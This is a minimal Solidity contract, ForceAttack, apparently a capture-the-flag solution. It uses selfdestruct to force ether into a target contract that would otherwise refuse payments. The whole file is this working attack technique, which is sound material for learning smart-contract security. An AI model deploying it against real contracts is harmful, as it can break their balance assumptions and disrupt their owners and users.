// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

contract ForceAttack {
    function attack(address _target) public payable {
        selfdestruct(payable(_target));
    }
}

// send some eth to when call attack()
